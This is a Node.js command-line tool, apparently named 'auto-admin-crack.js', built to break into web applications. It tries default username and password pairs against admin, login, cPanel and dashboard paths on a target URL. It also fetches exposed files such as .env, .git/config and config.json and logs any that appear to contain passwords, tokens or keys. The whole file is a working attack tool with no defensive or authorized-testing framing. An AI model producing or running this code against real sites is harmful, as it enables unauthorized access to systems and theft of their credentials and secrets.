#!/usr/bin/env node
const https = require('https');
const http = require('http');
const fs = require('fs');
const { URL } = require('url');

const log = fs.createWriteStream('logs/auto-admin-cracked.txt');
const defaultCreds = [['admin','admin'], ['root','root'], ['test','test'], ['admin','password']];
const targets = ['/admin', '/login', '/cpanel', '/dashboard'];
const leakPaths = ['/.env', '/.git/config', '/config.json', '/debug', '/js/app.js'];

function tryCreds(target, loginPath, creds) {
  creds.forEach(([user, pass]) => {
    const data = JSON.stringify({ username: user, password: pass });
    const url = new URL(target + loginPath);
    const mod = url.protocol === 'https:' ? https : http;
    const req = mod.request(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
      }
    }, res => {
      if (res.statusCode === 200) {
        const msg = `[AUTO-LOGIN SUCCESS] ${user}:${pass} @ ${url.href}\n`;
        console.log(msg); log.write(msg);
      }
    });
    req.on('error', () => {});
    req.write(data);
    req.end();
  });
}

function scanLeaks(target) {
  const mod = target.startsWith('https') ? https : http;
  leakPaths.forEach(p => {
    const u = target + p;
    mod.get(u, res => {
      if (res.statusCode === 200) {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          if (/password|user|token|secret|key/i.test(data)) {
            const leak = `[LEAK] ${u}\n${data.slice(0, 500)}\n`;
            console.log(leak); log.write(leak);
          }
        });
      }
    }).on('error', () => {});
  });
}

function run(target) {
  console.log(`[+] Scanning ${target}`);
  targets.forEach(path => tryCreds(target, path, defaultCreds));
  scanLeaks(target);
}

if (!process.argv[2]) {
  console.error("Usage: node tools/auto-admin-crack.js https://target.com");
  process.exit(1);
}
run(process.argv[2]);
